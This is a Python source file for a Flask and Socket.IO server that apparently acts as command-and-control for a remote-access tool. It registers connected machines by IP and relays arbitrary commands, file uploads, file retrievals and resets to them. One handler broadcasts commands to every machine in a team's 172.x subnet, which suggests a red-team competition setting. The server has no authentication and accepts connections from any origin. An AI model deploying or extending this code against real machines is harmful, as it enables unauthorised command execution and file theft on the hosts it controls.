import eventlet
import socketio
from flask import Flask, render_template, request, send_file

sio = socketio.Server(cors_allowed_origins='*', logger=False)
app = Flask(__name__)


@app.route('/')
def index():
  return render_template('index.html')
  
@app.route('/video')
def video():
  return send_file("video.mp4", as_attachment=True)

@app.errorhandler(404)
def catch_all(error):
    path = request.path
    sid = path.strip('/')  # Remove leading and trailing slashes
    if sid in connectedUsers:
        return render_template('connection.html')
    sid = sid.replace("/upload", "")
    print(sid)
    if sid in connectedUsers:
        return render_template("send.html")
    return render_template("index.html")


connectedUsers = {}


@sio.on('devices')
def returnConnected(sid):
  return connectedUsers


@sio.on('connect')
def connect(sid, environ):
  print(f'{sid} connected :)')


def ip_exists(ip, my_dict):
    for value in my_dict.values():
        if value == ip:
            return True
    return False

@sio.on('dataConnection')
def dataConnection(sid, ip):
  if (ip_exists(ip, connectedUsers) == False):
    connectedUsers[sid] = ip

@sio.on('commandTeam')
def commandTeam(sid, data):
  if (data["TEAM"] in [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,24]):
    teamIPs = {key: value for key, value in connectedUsers.items() if str(value).startswith("172." + str(data["TEAM"]))}
    if teamIPs != {}:
      IPs = [teamIPs.get(i) for i in teamIPs]
      for i in IPs:
        sio.emit("commandToClient", {
            "COMMAND": data["COMMAND"],
            "IP": i
        })
      return f"Command sent to {IPs}"
    else:
      return f"No devices found from team {data['TEAM']}"
  else:
    return f"No devices found from team {data['TEAM']}"


@sio.on('command')
def command(sid, data):
  #if this shit is not broken don't fix it
  if data["SID"] not in connectedUsers:
    sio.emit('resultStage2', {"RESULT": "Device disconnected, please return to main page to reconnect", "SID": data["SID"]})
    return
  sio.emit("commandToClient", {
      "COMMAND": data["COMMAND"],
      "IP": connectedUsers[data["SID"]]
  })




@sio.on('file')
def file(sid, data):
  sio.emit('fileStage2', {"FILE": data["FILE"], "FILENAME": data["FILENAME"], "SID": data["SID"]})

@sio.on('fileUploaded')
def fileUploaded(sid, data):
  sio.emit('fileUploadedStage2', {"SUCCESS": data["SUCCESS"], "SID": sid})

@sio.on('getFile')
def getFile(sid, data):
  sio.emit("getFileStage2", {
    "SID": data["SID"],
    "IP": data["IP"],
    "FILEPATH": data["FILEPATH"],
  })

@sio.on('uploadFile')
def uploadFile(sid, data):
  sio.emit("uploadFileStage2", {
    "FILE": data["FILE"],
    "FILENAME": data["FILENAME"],
    "IP": connectedUsers[data["SID"]],
  })

@sio.on('reset')
def reset(sid, data):
  sio.emit("resetStage2", {"IP": connectedUsers[data["SID"]]})


@sio.on('result')
def result(sid, data):
  sio.emit('resultStage2', {"RESULT": data, "SID": sid})


@sio.on('disconnect')
def disconnect(sid):
  if sid in connectedUsers:
    del connectedUsers[sid]
    print(f'{sid} disconnected :(')


if __name__ == '__main__':
  app = socketio.Middleware(sio, app)
  eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), app)
